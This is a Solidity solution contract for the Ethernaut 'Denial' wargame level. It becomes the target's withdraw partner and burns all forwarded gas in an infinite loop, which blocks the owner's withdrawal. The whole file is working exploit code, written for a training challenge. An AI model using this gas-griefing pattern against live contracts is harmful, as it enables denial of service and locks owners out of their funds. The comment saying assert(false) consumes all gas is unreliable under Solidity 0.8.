// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    function contractBalance() external view returns (uint256);
}

/**
 * @title DenialExploit
 * @dev Solution contract for Ethernaut Level 20 - Denial
 * 
 * This contract exploits the Denial contract by becoming a malicious withdraw partner
 * that consumes all gas, preventing the owner from receiving their withdrawal.
 * 
 * The vulnerability in the Denial contract is in the withdraw() function:
 * - It uses partner.call{value: amountToSend}("") which forwards all available gas
 * - After the call to partner, it tries to transfer funds to owner
 * - If the partner consumes all gas, the transfer to owner will fail
 * 
 * Attack Strategy:
 * 1. Deploy this contract with the target Denial address
 * 2. Call exploit() to register this contract as the withdraw partner
 * 3. This contract's receive() function will consume all gas using an infinite loop
 * 4. When withdraw() is called, the owner's transfer will fail due to out of gas
 */
contract DenialExploit {
    address public denial;
    address public owner;

    constructor(address _denial) {
        denial = _denial;
        owner = msg.sender;
    }

    /**
     * @dev Sets this contract as the withdraw partner in the Denial contract
     */
    function exploit() external {
        require(msg.sender == owner, "Not the owner");
        IDenial(denial).setWithdrawPartner(address(this));
    }

    /**
     * @dev Malicious receive function that consumes all gas
     * 
     * When the Denial contract calls this function with .call{value}(""),
     * it forwards all available gas. We consume all that gas with an infinite loop,
     * causing the subsequent transfer to the owner to fail.
     * 
     * Alternative methods to consume gas:
     * - assert(false): Consumes all gas
     * - Infinite loop: Runs until out of gas
     * - Expensive operations in a loop
     */
    receive() external payable {
        // Method 1: Infinite loop - consumes all gas
        while(true) {}
        
        // Method 2 (alternative): Assert false - consumes all gas
        // assert(false);
    }

    /**
     * @dev Check the balance of the Denial contract
     */
    function checkBalance() external view returns (uint256) {
        return IDenial(denial).contractBalance();
    }
}
